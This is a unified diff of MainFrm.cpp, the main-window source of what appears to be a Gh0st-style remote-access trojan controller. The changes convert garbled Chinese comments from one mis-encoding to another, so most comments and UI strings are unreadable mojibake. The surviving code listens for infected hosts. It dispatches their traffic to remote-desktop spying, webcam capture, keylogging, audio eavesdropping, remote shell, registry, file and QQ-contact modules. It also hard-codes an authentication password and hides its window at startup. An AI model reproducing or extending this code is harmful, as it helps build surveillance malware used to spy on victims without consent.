@@ -1,4 +1,4 @@
-ï»¿// MainFrm.cpp : implementation of the CMainFrame class
+// MainFrm.cpp : implementation of the CMainFrame class
 //
 
 #include "stdafx.h"
@@ -37,9 +37,9 @@ static char THIS_FILE[] = __FILE__;
 #endif
 
 extern CTabView* g_pTabView;
-CClientView* g_pConnectView = NULL; //åœ¨NotifyProcä¸­åˆå§‹åŒ–
+CClientView* g_pConnectView = NULL; //ÔÚNotifyProcÖĞ³õÊ¼»¯
 CIOCPServer *m_iocpServer = NULL;
-CMainFrame	*g_pFrame; // åœ¨CMainFrame::CMainFrame()ä¸­åˆå§‹åŒ–
+CMainFrame	*g_pFrame; // ÔÚCMainFrame::CMainFrame()ÖĞ³õÊ¼»¯
 extern CLogView* g_pLogView;
 CString		m_PassWord = "password";
 
@@ -64,7 +64,7 @@ BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
 	ON_COMMAND(IDM_BUILD_, OnBuild)
 	ON_COMMAND(IDM_DNSUPDATE, OnDnsUpdate)
 	ON_COMMAND(IDM_LOCK, OnLock)
-	ON_COMMAND(IDM_TOOLS, OnTools)     //å®ç”¨å·¥å…·
+	ON_COMMAND(IDM_TOOLS, OnTools)     //ÊµÓÃ¹¤¾ß
 	ON_WM_ERASEBKGND()
 	ON_WM_TIMER()
 	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
@@ -105,7 +105,7 @@ CMainFrame::CMainFrame()
 	// TODO: add member initialization code here
 	m_bSetRestart = NULL;
 	g_pFrame = this;
-	m_nCount = 0;//åˆå§‹åŒ–åœ¨çº¿ä¸»æœºæ•°
+	m_nCount = 0;//³õÊ¼»¯ÔÚÏßÖ÷»úÊı
 }
 
 CMainFrame::~CMainFrame()
@@ -118,10 +118,10 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	AfxGetApp()->m_nCmdShow = SW_HIDE;
 	if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
 		return -1;
-	//ç•Œé¢å±…ä¸­æ˜¾ç¤º
+	//½çÃæ¾ÓÖĞÏÔÊ¾
 	this ->CenterWindow(CWnd::GetDesktopWindow());
 	
-	// æ·»åŠ çŠ¶æ€æ 
+	// Ìí¼Ó×´Ì¬À¸
 	if (!m_wndStatusBar.Create(this) ||
 		!m_wndStatusBar.SetIndicators(indicators,
 		  sizeof(indicators)/sizeof(UINT)))
@@ -139,7 +139,7 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	
 //	XTPColorManager()->DisableLunaColors(TRUE);
 	
-	if (!m_TrayIcon.Create(_T("åˆè®¡: 0å°"), // Toolktip text
+	if (!m_TrayIcon.Create(_T("ºÏ¼Æ: 0Ì¨"), // Toolktip text
 		this,                       // Parent window
 		IDR_MAINFRAME,               // Icon resource ID
 		IDR_MINIMIZE,             // Resource ID of popup menu
@@ -150,13 +150,13 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 		return -1;
 	}	
 	
-	// åˆå§‹åŒ– command bars
+	// ³õÊ¼»¯ command bars
 	if (!InitCommandBars())
 	{
 		return -1;
 	}
 	
-	// è·å– command bars ç›®æ ‡ æŒ‡é’ˆ
+	// »ñÈ¡ command bars Ä¿±ê Ö¸Õë
 	CXTPCommandBars* pCommandBars = GetCommandBars();
 	if(pCommandBars == NULL)
 	{
@@ -164,17 +164,17 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 		return -1;      // fail to create
 	}
 	
-	//å»æ‰èœå•æ 
+	//È¥µô²Ëµ¥À¸
 	//SetMenu(NULL);
 
 	// Create MenuBar
-	CXTPMenuBar* pMenuBar = pCommandBars->SetMenu(_T("ä¸»èœå•æ "), IDR_MAINFRAME);
+	CXTPMenuBar* pMenuBar = pCommandBars->SetMenu(_T("Ö÷²Ëµ¥À¸"), IDR_MAINFRAME);
 	pMenuBar->ModifyBarStyle(CBRS_GRIPPER,0);
 	pMenuBar->EnableDocking(xtpFlagStretched);
 	pMenuBar->SetFlags(xtpFlagAddMDISysPopup);
 	
 	// Create ToolBar
-// 	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("ä¸»å·¥å…·æ "), xtpBarTop);
+// 	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("Ö÷¹¤¾ßÀ¸"), xtpBarTop);
 // 	if (!pCommandBar ||
 // 		!pCommandBar->LoadToolBar(IDR_TOOLBAR4))
 // 	{
@@ -200,10 +200,10 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	pCommandBars->GetCommandBarsOptions()->bShowTextBelowIcons = TRUE;
 	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowNever);
 	XTPColorManager()->DisableLunaColors(TRUE);
-	pCommandBars->SetTheme(xtpThemeWhidbey); //å·¥å…·æ 
+	pCommandBars->SetTheme(xtpThemeWhidbey); //¹¤¾ßÀ¸
 	
-//	CXTPPaintManager::SetTheme(xtpThemeWhidbey); //è®¾ç½®æ—¥å¿—å¯¹è¯æ¡†ä¸»é¢˜
-		// è®¾ç½® Office 2003 ä¸»é¢˜
+//	CXTPPaintManager::SetTheme(xtpThemeWhidbey); //ÉèÖÃÈÕÖ¾¶Ô»°¿òÖ÷Ìâ
+		// ÉèÖÃ Office 2003 Ö÷Ìâ
 	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
 	/*
 	xtpThemeOffice2000,     // Office 2000 theme.
@@ -222,7 +222,7 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	
 	LoadCommandBars(_T("CommandBars"));
 	SetTimer(1,1000,NULL); 
-	LoadIcons();  //èœå•å›¾ç‰‡æ˜¾ç¤º
+	LoadIcons();  //²Ëµ¥Í¼Æ¬ÏÔÊ¾
 
 	m_paneManager.InstallDockingPanes(this);
 	m_paneManager.SetTheme(xtpPaneThemeWinNative);
@@ -235,11 +235,11 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	xtpPaneThemeVisualStudio2005,      // Visual Studio 2005 Style Theme
 	*/
 
-	CXTPDockingPane* pwndPaneLog = CreatePane(300, 160, RUNTIME_CLASS(CLogView), _T("æ—¥å¿—ä¿¡æ¯"), xtpPaneDockBottom);
-//	CXTPDockingPane* pwndPaneplay = CreatePane(270, 165, RUNTIME_CLASS(CPlay), _T("ç³»ç»Ÿæ“ä½œ"), xtpPaneDockBottom);
-//	CXTPDockingPane* pwndPaneSignature = CreatePane(250, 160, RUNTIME_CLASS(CSignature), _T("æ•°å­—ç­¾å"), xtpPaneDockBottom);
-// 	CXTPDockingPane* pwndPaneLockFile = CreatePane(300, 165, RUNTIME_CLASS(CLockFile), _T("æ–‡ä»¶è§£å¯†"), xtpPaneDockBottom);
-// 	CXTPDockingPane* pwndPanePlayer = CreatePane(270, 160, RUNTIME_CLASS(CPlayer), _T("éŸ³ä¹æ’­æ”¾å™¨"), xtpPaneDockBottom);
+	CXTPDockingPane* pwndPaneLog = CreatePane(300, 160, RUNTIME_CLASS(CLogView), _T("ÈÕÖ¾ĞÅÏ¢"), xtpPaneDockBottom);
+//	CXTPDockingPane* pwndPaneplay = CreatePane(270, 165, RUNTIME_CLASS(CPlay), _T("ÏµÍ³²Ù×÷"), xtpPaneDockBottom);
+//	CXTPDockingPane* pwndPaneSignature = CreatePane(250, 160, RUNTIME_CLASS(CSignature), _T("Êı×ÖÇ©Ãû"), xtpPaneDockBottom);
+// 	CXTPDockingPane* pwndPaneLockFile = CreatePane(300, 165, RUNTIME_CLASS(CLockFile), _T("ÎÄ¼ş½âÃÜ"), xtpPaneDockBottom);
+// 	CXTPDockingPane* pwndPanePlayer = CreatePane(270, 160, RUNTIME_CLASS(CPlayer), _T("ÒôÀÖ²¥·ÅÆ÷"), xtpPaneDockBottom);
 	
 //	m_paneManager.AttachPane(pwndPaneplay,pwndPaneLog);
 // 	m_paneManager.AttachPane(pwndPaneSignature,pwndPaneplay);
@@ -257,7 +257,7 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	return 0;
 }
 
-void CMainFrame::LoadIcons()   //å³é”®èœå•æ˜¾ç¤ºå›¾æ ‡
+void CMainFrame::LoadIcons()   //ÓÒ¼ü²Ëµ¥ÏÔÊ¾Í¼±ê
 {
 // 	CXTPCommandBars* pCommandBars = GetCommandBars();
 // 
@@ -279,11 +279,11 @@ void CMainFrame::LoadIcons()   //å³é”®èœå•æ˜¾ç¤ºå›¾æ ‡
 // 		IDM_IBBSOR_E,IDM_IBBSOR_F,IDM_IBBSOR_G,IDM_IBBSOR_H,IDM_IBBSOR_J,IDM_SELECT_ALL,IDM_UNSELECT_ALL,0
 // 	};
 // 
-// 	UINT uiGroupFind6[] = {0,IDM_EVENT_DELETE,IDM_ALL_DELETE,IDM_EVENT_SAVE,IDM_EVENT_COPY,};  //æ—¥å¿—ç®¡ç†
+// 	UINT uiGroupFind6[] = {0,IDM_EVENT_DELETE,IDM_ALL_DELETE,IDM_EVENT_SAVE,IDM_EVENT_COPY,};  //ÈÕÖ¾¹ÜÀí
 // 
-// 	UINT uiGroupFind7[] = {IDM_DOWNEXEC,IDM_UPDATE_SERVER};  //ä¸‹è½½åŠŸèƒ½
+// 	UINT uiGroupFind7[] = {IDM_DOWNEXEC,IDM_UPDATE_SERVER};  //ÏÂÔØ¹¦ÄÜ
 // 
-// 	UINT uiGroupFind8[] = {ID_MENUITEM_PROXY_MAP,IDM_START,ID_Screen,IDM_Elevate_Privileges,ID_EXP_ReStart,ID_IEQC};  //æ–°åŠ 
+// 	UINT uiGroupFind8[] = {ID_MENUITEM_PROXY_MAP,IDM_START,ID_Screen,IDM_Elevate_Privileges,ID_EXP_ReStart,ID_IEQC};  //ĞÂ¼Ó
 // 
 // 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU1, uiGroupFind1, _countof(uiGroupFind1), CSize(16, 16));
 // 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU2, uiGroupFind2, _countof(uiGroupFind2), CSize(16, 16));
@@ -299,7 +299,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 {
 	if (lpCreateControl->bToolBar == FALSE)
  	{
-// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ä¸»æœºæ“ä½œ(&Z)"))
+// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("Ö÷»ú²Ù×÷(&Z)"))
 // 		{
 // 			if (lpCreateControl->nID != IDM_IBBSOR_A)
 // 			{
@@ -310,7 +310,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 // 			}			
 // 		}
 // 
-// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("æ‰“å¼€ç½‘å€(&V)"))
+// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("´ò¿ªÍøÖ·(&V)"))
 // 		{
 // 			if (lpCreateControl->nID != IDM_IBBSOR_B)
 // 			{
@@ -321,7 +321,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 // 			}
 // 		}
 // 
-// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ç­›é€‰åŠŸèƒ½(&T)"))
+// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("É¸Ñ¡¹¦ÄÜ(&T)"))
 // 		{
 // 			if (lpCreateControl->nID != IDM_IBBSOR_C)
 // 			{
@@ -332,7 +332,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 // 			return TRUE;
 // 		}
 // 
-// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ä¿¡æ¯æ›´æ”¹(&M)"))
+// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ĞÅÏ¢¸ü¸Ä(&M)"))
 // 		{
 // 			if (lpCreateControl->nID != IDM_IBBSOR_D)
 // 			{
@@ -343,7 +343,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 // 			return TRUE;
 // 		}
 // 
-// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("æ§ä»¶ç®¡ç†(&K)"))
+// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("¿Ø¼ş¹ÜÀí(&K)"))
 // 		{
 // 			if (lpCreateControl->nID != IDM_IBBSOR_E)
 // 			{
@@ -354,7 +354,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 // 			return TRUE;
 // 		}
 // 
-// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("æ–‡ä»¶ä¸Šä¼ (&O)"))
+// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ÎÄ¼şÉÏ´«(&O)"))
 // 		{
 // 			if (lpCreateControl->nID != IDM_IBBSOR_F)
 // 			{
@@ -365,7 +365,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 // 			return TRUE;
 // 		}
 
-		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ä¼šè¯ç®¡ç†"))
+		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("»á»°¹ÜÀí"))
 		{
 			if (lpCreateControl->nID != IDM_IBBSOR_G)
 			{
@@ -376,7 +376,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 			return TRUE;
 		}
 
-		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("å¸¸ç”¨é™„åŠ "))
+		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("³£ÓÃ¸½¼Ó"))
 		{
 			if (lpCreateControl->nID != IDM_IBBSOR_H)
 			{
@@ -386,7 +386,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 			}
 			return TRUE;
 		}
-// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ä¸‹è½½åŠŸèƒ½(&B)"))
+// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ÏÂÔØ¹¦ÄÜ(&B)"))
 // 		{
 // 			if (lpCreateControl->nID != IDM_IBBSOR_I)
 // 			{
@@ -396,7 +396,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 // 			}
 // 			return TRUE;
 // 		}
-// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("æ¸…ç†æ—¥å¿—(&Q)"))
+// 		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ÇåÀíÈÕÖ¾(&Q)"))
 // 		{
 // 			if (lpCreateControl->nID != IDM_IBBSOR_J)
 // 			{
@@ -411,7 +411,7 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 	return FALSE;
 }
 
-void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key) //è§£å¯†æ’ä»¶
+void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key) //½âÃÜ²å¼ş
 {
 	unsigned long i;
 	unsigned char p;
@@ -481,7 +481,7 @@ CString Base64Decode(LPCTSTR lpszSrc)
 			if (iTest == 0xFF) 
 			{
 				j--;
-				continue; //è¯»åˆ°255éæ³•å­—ç¬¦
+				continue; //¶Áµ½255·Ç·¨×Ö·û
 			}
 			iPack = iPack << 6 ;
 			iPack = iPack | iTest ;
@@ -491,7 +491,7 @@ CString Base64Decode(LPCTSTR lpszSrc)
 		pOutBuffer[1] = iPack;
 		iPack = iPack >> 8;
 		pOutBuffer[0] = iPack;
-		//å‡†å¤‡å†™å…¥å3ä½
+		//×¼±¸Ğ´Èëºó3Î»
 		pOutBuffer+= 3; iPack = 0;
 		
 	}
@@ -564,7 +564,7 @@ BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
     //SYSTEMTIME st;
     //GetLocalTime(&st);
 	//strTime.Format("%s   (%d-%d-%d %d:%d)", "Eagle Eye 1.0", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
-	cs.lpszName = "Emin-monage";				   
+	cs.lpszName = "×ÔÓÃ-monage";				   
 	
 	return TRUE;
 }
@@ -609,10 +609,10 @@ void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UI
 	{
 		CMainFrame* pFrame = (CMainFrame*) lpParam;
 		CString str;
-		// å¯¹g_pConnectView è¿›è¡Œåˆå§‹åŒ–
+		// ¶Ôg_pConnectView ½øĞĞ³õÊ¼»¯
 		g_pConnectView = (CClientView *)((CClientApp *)AfxGetApp())->m_pConnectView;
 
-		// g_pConnectViewè¿˜æ²¡åˆ›å»ºï¼Œè¿™æƒ…å†µä¸ä¼šå‘ç”Ÿ
+		// g_pConnectView»¹Ã»´´½¨£¬ÕâÇé¿ö²»»á·¢Éú
 		if (((CClientApp *)AfxGetApp())->m_pConnectView == NULL)
 			return;
 
@@ -656,20 +656,20 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
 	HICON icon2 = (HICON)::LoadImage(AfxGetInstanceHandle(),
 		MAKEINTRESOURCE(IDI_shangx),IMAGE_ICON, 16, 16, LR_SHARED);
 	
-	//	CMainFrame* pFrm=(CMainFrame*)AfxGetApp()->m_pMainWnd;//å¾—åˆ°ä¸»æ¡†æ¶ç±»æŒ‡é’ˆ
-	CStatusBar* pStatus=&g_pFrame->m_wndStatusBar;//æŒ‡é’ˆçŠ¶æ€æ æŒ‡é’ˆ,m_wndStatusBarè¢«æˆ‘æ”¹æˆpublicå±æ€§äº†.
+	//	CMainFrame* pFrm=(CMainFrame*)AfxGetApp()->m_pMainWnd;//µÃµ½Ö÷¿ò¼ÜÀàÖ¸Õë
+	CStatusBar* pStatus=&g_pFrame->m_wndStatusBar;//Ö¸Õë×´Ì¬À¸Ö¸Õë,m_wndStatusBar±»ÎÒ¸Ä³ÉpublicÊôĞÔÁË.
 	if(pStatus)
-	{ //åŠ è½½å›¾æ ‡çš„èµ„æº
+	{ //¼ÓÔØÍ¼±êµÄ×ÊÔ´
 		pStatus->GetStatusBarCtrl().SetIcon(0,icon0);
 		pStatus->GetStatusBarCtrl().SetIcon(1,icon1);
 		pStatus->GetStatusBarCtrl().SetIcon(2,icon2);
 	}
 	
-	//è¯·åˆç†ä½¿ç”¨æœ¬ç¨‹åºï¼Œå› ä¸ºæœ¬ç¨‹åºæ‰€é€ æˆçš„ä»»ä½•æ³•å¾‹è´£ä»»ä½œè€…ä¸äºˆæ‰¿æ‹…
-//	char strText[] = "å›¯ç£¸é¹ƒåŠ¦æ©î„±ç¡¦åº«ï¼Šå²‡å½î„±ç¡¦åº«å¬½æ™ç¡¡çœ°å”¸ç£®ä¹ç´–æå”¸æ¥“æ†»îƒ–æ’´ç¡¯ä¿";
+	//ÇëºÏÀíÊ¹ÓÃ±¾³ÌĞò£¬ÒòÎª±¾³ÌĞòËùÔì³ÉµÄÈÎºÎ·¨ÂÉÔğÈÎ×÷Õß²»Óè³Ğµ£
+//	char strText[] = "‡ë´¾é„µ“ƒ­¸³Šì£ªŒìˆ¤­¸³Šì‹õ’ê³…±‚†ˆ´ˆ·¦¼…’î†ˆ—÷‘Ÿ¬»“æ³±£";
 //	DecryptData((unsigned char*)strText,strlen(strText),998);
 //	g_pLogView->InsertLogItem((strText), 0, 3);
-//	g_pLogView->InsertLogItem("ç³»ç»Ÿå¯åŠ¨ï¼š",(strText), 0, 0 );
+//	g_pLogView->InsertLogItem("ÏµÍ³Æô¶¯£º",(strText), 0, 0 );
 	CString str, strLogText;
 	
 	if (m_iocpServer != NULL)
@@ -680,7 +680,7 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
 	}
 	m_iocpServer = new CIOCPServer;
 	
-	// å¼€å¯IPCPæœåŠ¡å™¨
+	// ¿ªÆôIPCP·şÎñÆ÷
 	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{
 		CString IP;
@@ -700,28 +700,28 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
 		web.Format(_T("%s: %d"), IP, nPort);
 		m_wndStatusBar.SetPaneText(0, web);
 		
-// 		strLogText.Format("%s   ç›‘å¬ç«¯å£: [%d]", "æ¬¢è¿ä½¿ç”¨ ", nPort);
+// 		strLogText.Format("%s   ¼àÌı¶Ë¿Ú: [%d]", "»¶Ó­Ê¹ÓÃ ", nPort);
 // 		g_pLogView->InsertLogItem(strLogText, 0, 0);
-		strLogText.Format( "%s   ç›‘å¬ç«¯å£: [%d] --> ç›‘å¬æˆåŠŸ ", "æ¬¢è¿ä½¿ç”¨!", nPort);
-		g_pLogView->InsertLogItem("ç³»ç»Ÿå¯åŠ¨ï¼š",strLogText, 0, 4 );
+		strLogText.Format( "%s   ¼àÌı¶Ë¿Ú: [%d] --> ¼àÌı³É¹¦ ", "»¶Ó­Ê¹ÓÃ!", nPort);
+		g_pLogView->InsertLogItem("ÏµÍ³Æô¶¯£º",strLogText, 0, 4 );
 	}
 	else
 	{
 		ShowWindow(SW_SHOW);
 		UpdateWindow();
 		
-// 		strLogText.Format("%s   ç«¯å£[%d]ç›‘å¬å¤±è´¥ï¼", "æ¬¢è¿ä½¿ç”¨ ", nPort);
+// 		strLogText.Format("%s   ¶Ë¿Ú[%d]¼àÌıÊ§°Ü£¡", "»¶Ó­Ê¹ÓÃ ", nPort);
 // 		g_pLogView->InsertLogItem(strLogText, 1, 1);
 
-	//	strLogText.Format( "ç›‘å¬ç«¯å£: [%d]ç»‘å®šå¤±è´¥,å¯èƒ½ä½ å·²å¼€å¯å¦ä¸€ä¸ªæ§åˆ¶ç«¯æˆ–è€…ç«¯å£è¢«å ç”¨ï¼", nPort);
-	//	g_pLogView->InsertLogItem("ç³»ç»Ÿå¯åŠ¨ï¼š",strLogText, 0, 5 );
+	//	strLogText.Format( "¼àÌı¶Ë¿Ú: [%d]°ó¶¨Ê§°Ü,¿ÉÄÜÄãÒÑ¿ªÆôÁíÒ»¸ö¿ØÖÆ¶Ë»òÕß¶Ë¿Ú±»Õ¼ÓÃ£¡", nPort);
+	//	g_pLogView->InsertLogItem("ÏµÍ³Æô¶¯£º",strLogText, 0, 5 );
 		
-		str.Format(_T("ç«¯å£[%d]ç›‘å¬å¤±è´¥"), nPort);
+		str.Format(_T("¶Ë¿Ú[%d]¼àÌıÊ§°Ü"), nPort);
 		AfxMessageBox(str);
 		m_wndStatusBar.SetPaneText(0, str);
 	}
 	
-//	m_wndStatusBar.SetPaneText(2, "åˆè®¡: 0å°");
+//	m_wndStatusBar.SetPaneText(2, "ºÏ¼Æ: 0Ì¨");
 
 }
 
@@ -730,51 +730,51 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 	if (pContext == NULL)
 		return;
 
-	// å¦‚æœç®¡ç†å¯¹è¯æ¡†æ‰“å¼€ï¼Œäº¤ç»™ç›¸åº”çš„å¯¹è¯æ¡†å¤„ç†
+	// Èç¹û¹ÜÀí¶Ô»°¿ò´ò¿ª£¬½»¸øÏàÓ¦µÄ¶Ô»°¿ò´¦Àí
 	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
 	
-	// äº¤ç»™çª—å£å¤„ç†
+	// ½»¸ø´°¿Ú´¦Àí
 	if (pContext->m_Dialog[0] > 0)
 	{
 		switch (pContext->m_Dialog[0])
 		{
-		case SCREENSPY_DLG:   //è¿œç¨‹æ¡Œé¢
+		case SCREENSPY_DLG:   //Ô¶³Ì×ÀÃæ
 			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
 			break;
-		case WEBCAM_DLG:      //è§†é¢‘æŸ¥çœ‹
+		case WEBCAM_DLG:      //ÊÓÆµ²é¿´
 			((CWebCamDlg *)dlg)->OnReceiveComplete();
 			break;
-		case FILEMANAGER_DLG: //æ–‡ä»¶ç®¡ç†
+		case FILEMANAGER_DLG: //ÎÄ¼ş¹ÜÀí
 			((CFileManagerDlg *)dlg)->OnReceiveComplete();
 			break;
-		case KEYBOARD_DLG:    //é”®ç›˜è®°å½•
+		case KEYBOARD_DLG:    //¼üÅÌ¼ÇÂ¼
 			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
 			break;
-		case SYSTEM_DLG:      //ç³»ç»Ÿç®¡ç†
+		case SYSTEM_DLG:      //ÏµÍ³¹ÜÀí
 			((CSystemDlg *)dlg)->OnReceiveComplete();
 			break;
-		case DLL_DLG:         //æ’ä»¶åŠ è½½
+		case DLL_DLG:         //²å¼ş¼ÓÔØ
 			((CDllDlg *)dlg)->OnReceiveComplete();
 	    	break;
-		case AUDIO_DLG:       //è¯­éŸ³ç›‘å¬
+		case AUDIO_DLG:       //ÓïÒô¼àÌı
 			((CAudioDlg *)dlg)->OnReceiveComplete();
 			break;
-		case SHELL_DLG:       //è¿œç¨‹ç»ˆç«¯
+		case SHELL_DLG:       //Ô¶³ÌÖÕ¶Ë
 			((CShellDlg *)dlg)->OnReceiveComplete();
 			break;
-		case SYSINFO_DLG:     //ä¸»æœºç®¡ç†
+		case SYSINFO_DLG:     //Ö÷»ú¹ÜÀí
 			((CSysInfo *)dlg)->OnReceiveComplete();
 			break;
-		case SERMANAGER_DLG:  //æœåŠ¡ç®¡ç†
+		case SERMANAGER_DLG:  //·şÎñ¹ÜÀí
 			((CSerManager *)dlg)->OnReceiveComplete();
 			break;
-		case REGEDIT_DLG:     //æŸ¥æ³¨å†Œè¡¨
+		case REGEDIT_DLG:     //²é×¢²á±í
             ((CRegDlg *)dlg)->OnReceiveComplete();
 			break;
-		case CHAT_DLG:        //è¿œç¨‹äº¤è°ˆ
+		case CHAT_DLG:        //Ô¶³Ì½»Ì¸
 			((CChat *)dlg)->OnReceiveComplete();
 			break;
-		case QQINFO_DLG:      //å¥½å‹ä¿¡æ¯
+		case QQINFO_DLG:      //ºÃÓÑĞÅÏ¢
 			((CQQInfoDlg *)dlg)->OnReceiveComplete();
 			break;
 		case PROXYMAP_DLG:
@@ -788,48 +788,48 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 
 	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
 	{
-	case TOKEN_AUTH: // è¦æ±‚éªŒè¯
+	case TOKEN_AUTH: // ÒªÇóÑéÖ¤
 		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
 		break;
-	case TOKEN_HEARTBEAT: // å›å¤å¿ƒè·³åŒ…
+	case TOKEN_HEARTBEAT: // »Ø¸´ĞÄÌø°ü
 		{
 			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
 			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 		}
 		break;
-	case TOKEN_LOGIN: // ä¸Šçº¿åŒ…
+	case TOKEN_LOGIN: // ÉÏÏß°ü
 		{
 			pContext->m_bIsMainSocket = true;
 			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
-			// æ¿€æ´»
+			// ¼¤»î
 			BYTE	bToken = COMMAND_ACTIVED;
 			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 		}
 		break;
-	case TOKEN_DRIVE_LIST: // é©±åŠ¨å™¨åˆ—è¡¨
-		// æŒ‡æ¥è°ƒç”¨publicå‡½æ•°éæ¨¡æ€å¯¹è¯æ¡†ä¼šå¤±å»ååº”ï¼Œ ä¸çŸ¥é“æ€ä¹ˆå›äº‹,å¤ªèœ
+	case TOKEN_DRIVE_LIST: // Çı¶¯Æ÷ÁĞ±í
+		// Ö¸½Óµ÷ÓÃpublicº¯Êı·ÇÄ£Ì¬¶Ô»°¿ò»áÊ§È¥·´Ó¦£¬ ²»ÖªµÀÔõÃ´»ØÊÂ,Ì«²Ë
 		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_BITMAPINFO: //
-		// æŒ‡æ¥è°ƒç”¨publicå‡½æ•°éæ¨¡æ€å¯¹è¯æ¡†ä¼šå¤±å»ååº”ï¼Œ ä¸çŸ¥é“æ€ä¹ˆå›äº‹
+		// Ö¸½Óµ÷ÓÃpublicº¯Êı·ÇÄ£Ì¬¶Ô»°¿ò»áÊ§È¥·´Ó¦£¬ ²»ÖªµÀÔõÃ´»ØÊÂ
 		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_WEBCAM_BITMAPINFO: // æ‘„åƒå¤´
+	case TOKEN_WEBCAM_BITMAPINFO: // ÉãÏñÍ·
 		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_AUDIO_START: // è¯­éŸ³
+	case TOKEN_AUDIO_START: // ÓïÒô
 		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_KEYBOARD_START://é”®ç›˜
+	case TOKEN_KEYBOARD_START://¼üÅÌ
 		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_SYSTEMINFO://è¿›ç¨‹åˆ—è¡¨
+	case TOKEN_SYSTEMINFO://½ø³ÌÁĞ±í
 		g_pConnectView->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)pContext);
 		break;
